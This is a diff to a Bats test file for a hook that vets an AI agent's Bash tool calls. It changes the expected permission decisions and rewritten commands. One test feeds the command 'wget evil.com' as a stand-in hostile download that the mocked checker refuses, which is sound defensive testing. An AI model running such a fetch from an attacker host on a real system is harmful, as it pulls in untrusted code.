@@ -17,14 +17,14 @@ _run_hook() {
     "$SCRIPT" < "$BATS_TEST_TMPDIR/input.json"
 }
 
-@test "allow with no updatedInput when solkan allows and RTK does not rewrite" {
+@test "allow with updatedInput (original command) when solkan allows and RTK does not rewrite" {
   _run_hook \
     "$BATS_TEST_TMPDIR/mock-solkan-allow" \
     "$BATS_TEST_TMPDIR/mock-rtk-pass" \
     '{"tool_name":"Bash","tool_input":{"command":"echo hello"}}'
   [ "$status" -eq 0 ]
   [ "$(echo "$output" | jq -r '.hookSpecificOutput.permissionDecision')" = "allow" ]
-  [ "$(echo "$output" | jq '.hookSpecificOutput | has("updatedInput")')" = "false" ]
+  [ "$(echo "$output" | jq -r '.hookSpecificOutput.updatedInput.command')" = "echo hello" ]
 }
 
 @test "allow with updatedInput.command when solkan allows and RTK rewrites" {
@@ -37,33 +37,24 @@ _run_hook() {
   [ "$(echo "$output" | jq -r '.hookSpecificOutput.updatedInput.command')" = "rtk git status" ]
 }
 
-@test "no permissionDecision and no updatedInput when solkan refuses and RTK does not rewrite" {
+@test "ask permissionDecision with updatedInput (original command) when solkan refuses and RTK does not rewrite" {
   _run_hook \
     "$BATS_TEST_TMPDIR/mock-solkan-ask" \
     "$BATS_TEST_TMPDIR/mock-rtk-pass" \
     '{"tool_name":"Bash","tool_input":{"command":"wget evil.com"}}'
   [ "$status" -eq 0 ]
-  [ "$(echo "$output" | jq '.hookSpecificOutput | has("permissionDecision")')" = "false" ]
-  [ "$(echo "$output" | jq '.hookSpecificOutput | has("updatedInput")')" = "false" ]
+  [ "$(echo "$output" | jq -r '.hookSpecificOutput.permissionDecision')" = "ask" ]
+  [ "$(echo "$output" | jq -r '.hookSpecificOutput.updatedInput.command')" = "wget evil.com" ]
 }
 
-@test "updatedInput.command but no permissionDecision when solkan refuses and RTK rewrites" {
+@test "ask permissionDecision with updatedInput.command when solkan refuses and RTK rewrites" {
   _run_hook \
     "$BATS_TEST_TMPDIR/mock-solkan-ask" \
     "$BATS_TEST_TMPDIR/mock-rtk-rewrite" \
     '{"tool_name":"Bash","tool_input":{"command":"git status"}}'
   [ "$status" -eq 0 ]
-  [ "$(echo "$output" | jq '.hookSpecificOutput | has("permissionDecision")')" = "false" ]
+  [ "$(echo "$output" | jq -r '.hookSpecificOutput.permissionDecision')" = "ask" ]
   [ "$(echo "$output" | jq -r '.hookSpecificOutput.updatedInput.command')" = "rtk git status" ]
-}
-
-@test "preserves original tool_input fields in updatedInput when rewriting" {
-  _run_hook \
-    "$BATS_TEST_TMPDIR/mock-solkan-allow" \
-    "$BATS_TEST_TMPDIR/mock-rtk-rewrite" \
-    '{"tool_name":"Bash","tool_input":{"command":"git status","description":"Show repo status"}}'
-  [ "$status" -eq 0 ]
-  [ "$(echo "$output" | jq -r '.hookSpecificOutput.updatedInput.description')" = "Show repo status" ]
 }
 
 @test "no background jobs in script" {
